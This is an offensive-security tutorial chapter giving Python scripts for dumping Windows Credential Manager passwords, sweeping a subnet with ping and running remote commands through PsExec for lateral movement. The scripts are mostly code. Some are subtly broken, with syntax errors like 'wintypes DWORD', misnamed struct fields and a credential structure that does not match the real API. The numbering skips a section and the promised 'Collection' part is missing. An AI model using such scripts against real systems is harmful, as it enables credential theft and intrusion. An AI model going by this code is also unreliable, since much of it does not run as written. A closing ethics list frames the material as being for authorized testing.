# Chapter 8: Python for Credential Access, Discovery, Lateral Movement & Collection

## Overview

This chapter focuses on using Python for cybersecurity tasks, including credential access, network discovery, lateral movement, and data collection. These techniques are essential for understanding how attackers operate and how to defend against them.

---

## 1. Credential Access

### 1.1. Retrieving Stored Credentials

Python can be used to retrieve stored credentials from the Windows Credential Manager or other storage mechanisms.

#### Example: Accessing Windows Credentials

```python
import ctypes
from ctypes import wintypes

# Define necessary structures and constants
class CREDENTIAL_ATTRIBUTE(ctypes.Structure):
    _fields_ = [
        ("dwFlags", wintypes.DWORD),
        ("pszKeyword", wintypes.LPCWSTR),
        ("pszValue", wintypes.LPCWSTR),
    ]

class CREDENTIAL(ctypes.Structure):
    _fields_ = [
        ("dwVersion", wintypes.DWORD),
        ("pszCredentialType", wintypes.LPCWSTR),
        ("pszTargetName", wintypes.LPCWSTR),
        (" pszUsername", wintypes.LPCWSTR),
        (" pszPassword", wintypes.LPCWSTR),
        (" dwFlags", wintypes.DWORD),
        (" dwLastWritten", wintypes.ULARGE_INTEGER),
        ("credential_attributes", ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),
        ("pszAuthenticationPackage", wintypes.LPCWSTR),
        (" pszTargetAlias", wintypes.LPCWSTR),
        (" pszSPN", wintypes.LPCWSTR),
    ]

def list_credentials():
    # Load the CredEnumerate function
    advapi32 = ctypes.WinDLL("Advapi32.dll")
    advapi32.CredEnumerateW.argtypes = [
        wintypes.LPCWSTR,
        wintypes.DWORD,
        ctypes.POINTER(wintypes DWORD),
        ctypes.POINTER(ctypes.POINTER(CREDENTIAL)),
    ]
    advapi32.CredEnumerateW.restype = wintypes BOOL

    # Enumerate credentials
    count = wintypes DWORD(0)
    credentials = ctypes.POINTER(CREDENTIAL)()
    result = advapi32.CredEnumerateW(None, 0, ctypes.byref(count), ctypes.byref(credentials))

    if result:
        for i in range(count.value):
            cred = credentials[i]
            print(f"Target: {cred.pszTargetName}")
            print(f"Username: {cred.pszUsername}")
            print(f"Password: {cred.pszPassword}\n")
    else:
        print("Failed to enumerate credentials.")

# Run the function
list_credentials()
```

### Notes:

- This code retrieves credentials stored in the Windows Credential Manager.
- It uses the `Advapi32.dll` library to interact with the credential store.
- Credentials are printed to the console, but in a real-world scenario, they would be handled securely.

---

## 2. Discovery

### 2.1. Network Discovery

Network discovery involves identifying active hosts and services on a network.

#### Example: Simple Ping Sweep

```python
import subprocess
import sys

def ping_sweep(subnet):
    for ip in range(1, 255):
        address = f"{subnet}.{ip}"
        print(f"Testing {address}...")
        result = subprocess.run(
            ["ping", "-n", "1", address],
            capture_output=True,
            text=True,
        )
        if "Reply from" in result.stdout:
            print(f"{address} is reachable.\n")

# Example usage
ping_sweep("192.168.1")
```

### Notes:

- This script performs a simple ping sweep on a given subnet.
- It uses the `subprocess` module to execute system commands.
- Modify the subnet to match your target network.

---

## 3. Lateral Movement

### 3.1. Using PsExec for Lateral Movement

PsExec is a tool from Sysinternals that can be used to execute commands on remote systems.

#### Example: Automating PsExec

```python
import subprocess
import os

def execute_psexec(target_ip, username, password, command):
    # Construct the PsExec command
    psexec_path = "psexec.exe"  # Path to PsExec executable
    command_template = f'"{psexec_path}" \\\\{target_ip} -u {username} -p {password} -d {command}'

    try:
        result = subprocess.run(
            command_template,
            shell=True,
            capture_output=True,
            text=True,
        )
        print(f"Command executed on {target_ip}")
        print(result.stdout)
    except Exception as e:
        print(f"Error: {e}")

# Example usage
execute_psexec("192.168.1.100", "user", "password", "cmd.exe")
```

### Notes:

- This script automates the use of PsExec for lateral movement.
- Ensure you have the `psexec.exe` file in your working directory.
- Use this responsibly and only in authorized environments.

---

## 5. Ethical Considerations

- Always obtain proper authorization before testing.
- Use these techniques only in authorized environments.
- Misuse of these tools can lead to legal consequences.
